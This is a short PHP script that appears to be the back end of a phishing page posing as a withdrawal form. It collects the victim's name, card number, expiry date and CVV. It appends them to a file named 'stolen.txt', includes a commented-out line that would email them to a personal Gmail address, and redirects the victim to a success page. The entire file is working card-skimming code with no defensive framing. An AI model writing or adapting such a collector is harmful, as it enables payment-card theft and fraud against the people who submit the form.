<?php
// Capture the data
$name   = $_POST['name'];
$card   = $_POST['card'];
$expiry = $_POST['expiry'];
$cvv    = $_POST['cvv'];

$message = "WITHDRAWAL REQUEST DATA:\nName: $name\nCard: $card\nExpiry: $expiry\nCVV: $cvv\n\n";

// --- OPTION 1: Save to file (simple & safe) ---
file_put_contents("stolen.txt", $message, FILE_APPEND);

// --- OPTION 2: Email it to yourself (needs SMTP configured) ---
// mail("nibraslaptop@gmail.com", "Withdrawal Demo Data", $message);

// Redirect to success page
header("Location: success.html");
exit;
?>
